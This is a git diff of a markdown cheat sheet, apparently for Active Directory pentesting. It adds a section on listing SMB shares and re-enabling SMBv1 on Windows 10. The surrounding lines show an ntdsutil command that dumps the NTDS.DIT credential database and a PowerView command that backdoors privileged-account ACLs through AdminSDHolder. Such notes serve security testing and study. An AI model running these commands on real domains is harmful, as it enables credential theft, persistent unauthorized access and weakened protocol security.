@@ -19,6 +19,7 @@ permalink: /:categories/:title/
 * [ABUSING DELEGATION](#ABUSINGDELEGATION)
 * [DUMP NTDS.DIT](#DUMPNTDS.DIT)
 * [Admin SDHolder](#AdminSDHolder)
+* [SMB v1](#SMBv1)
 
 <!-- vscode-markdown-toc-config
 	numbering=false
@@ -141,3 +142,14 @@ ntdsutil.exe "activate instance ntds" "ifm" "Create Full C:\Temp\ntds.dmp" quit 
 # backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
 Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=<Domain>,DC=local' -PrincipalIdentity matt -Rights All/
 ```
+
+
+## <a name='SMBv1'></a>SMB v1
+```
+# connecting from kali to windows
+smbclient -U jomivz -L 1.2.3.4 -W testlab.local
+
+# win10 tampering: PS activate SMBv1 OptionalFeatures
+Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol
+```
+Reference: [Docs Microsoft - configuring SMB](https://docs.microsoft.com/en-us/windows-server/storage/file-server/troubleshoot/detect-enable-and-disable-smbv1-v2-v3)
